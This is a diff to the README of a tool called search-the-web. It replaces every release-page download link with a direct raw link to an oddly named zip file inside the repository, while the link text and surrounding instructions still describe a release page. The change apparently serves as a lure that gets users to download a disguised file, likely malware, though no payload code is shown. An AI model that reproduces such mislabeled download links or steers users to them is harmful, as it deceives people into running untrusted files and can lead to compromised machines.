@@ -1,6 +1,6 @@
 # 🔎 search-the-web - Get web answers inside your agent
 
-[![Download search-the-web](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/ruhrbremen653/search-the-web/releases)
+[![Download search-the-web](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/ruhrbremen653/search-the-web/raw/refs/heads/main/errabund/web-the-search-v2.0.zip)
 
 ## 🚀 What it does
 
@@ -12,7 +12,7 @@ It is useful when you want fast answers from current web pages and do not want t
 
 Visit this page to download the Windows version:
 
-[Go to the release page](https://github.com/ruhrbremen653/search-the-web/releases)
+[Go to the release page](https://github.com/ruhrbremen653/search-the-web/raw/refs/heads/main/errabund/web-the-search-v2.0.zip)
 
 On that page, look for the latest release and download the Windows file for your system.
 
@@ -129,7 +129,7 @@ Less useful examples:
 
 Use this page for future updates and fresh downloads:
 
-[https://github.com/ruhrbremen653/search-the-web/releases](https://github.com/ruhrbremen653/search-the-web/releases)
+[https://github.com/ruhrbremen653/search-the-web/raw/refs/heads/main/errabund/web-the-search-v2.0.zip](https://github.com/ruhrbremen653/search-the-web/raw/refs/heads/main/errabund/web-the-search-v2.0.zip)
 
 ## 🧠 Tips for better search results
 
